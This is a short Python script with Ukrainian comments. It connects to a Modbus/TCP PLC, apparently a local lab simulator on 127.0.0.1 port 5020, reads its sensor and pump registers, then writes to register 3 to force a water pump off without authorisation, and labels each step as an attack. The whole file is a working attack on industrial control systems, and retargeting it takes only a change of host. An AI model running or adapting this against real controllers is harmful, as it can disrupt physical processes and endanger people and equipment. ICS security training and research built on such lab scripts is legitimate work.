import time
from pymodbus.client.sync import ModbusTcpClient


PLC_HOST = "127.0.0.1"
PLC_PORT = 5020


def modbus_command_injection():
    """
    Modbus Command Injection Attack

    Атака записує несанкціоноване значення в PLC-регістр,
    який відповідає за стан насоса.

    Register 3:
    1 — Pump ON
    0 — Pump OFF
    """

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print("Cannot connect to PLC")
        return

    print("Connected to PLC")
    print("Starting Modbus Command Injection attack...")

    # Читаємо стан до атаки
    before = client.read_holding_registers(0, 4, unit=1)

    if not before.isError():
        print("\nBefore attack:")
        print(f"Temperature : {before.registers[0]}")
        print(f"Pressure    : {before.registers[1]}")
        print(f"Water Level : {before.registers[2]}")
        print(f"Pump Status : {before.registers[3]}")

    time.sleep(1)

    # АТАКА: вимикаємо насос
    client.write_register(3, 0, unit=1)

    print("\nAttack executed: Pump forced OFF")

    time.sleep(2)

    # Читаємо стан після атаки
    after = client.read_holding_registers(0, 4, unit=1)

    if not after.isError():
        print("\nAfter attack:")
        print(f"Temperature : {after.registers[0]}")
        print(f"Pressure    : {after.registers[1]}")
        print(f"Water Level : {after.registers[2]}")
        print(f"Pump Status : {after.registers[3]}")

    client.close()


if __name__ == "__main__":
    modbus_command_injection()